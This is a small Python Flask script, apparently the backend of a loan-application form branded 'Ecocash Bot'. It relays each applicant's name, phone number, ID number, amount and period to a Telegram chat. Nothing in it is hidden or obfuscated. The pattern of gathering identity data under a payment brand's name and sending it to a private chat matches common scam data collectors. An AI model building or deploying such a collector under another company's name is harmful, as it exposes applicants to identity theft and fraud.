import os, requests
from flask import Flask, request, jsonify

app = Flask(__name__)
TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

@app.route("/")
def home():
    return "Ecocash Bot is Online!"

@app.route("/apply", methods=["POST"])
def apply():
    data = request.form or request.json
    msg = f"💰 NEW LOAN\n\n👤 Name: {data.get('name','')}\n📞 Phone: {data.get('phone','')}\n🪪 ID: {data.get('id','')}\n💵 Amount: {data.get('amount','')}\n📅 Period: {data.get('period','')}"
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
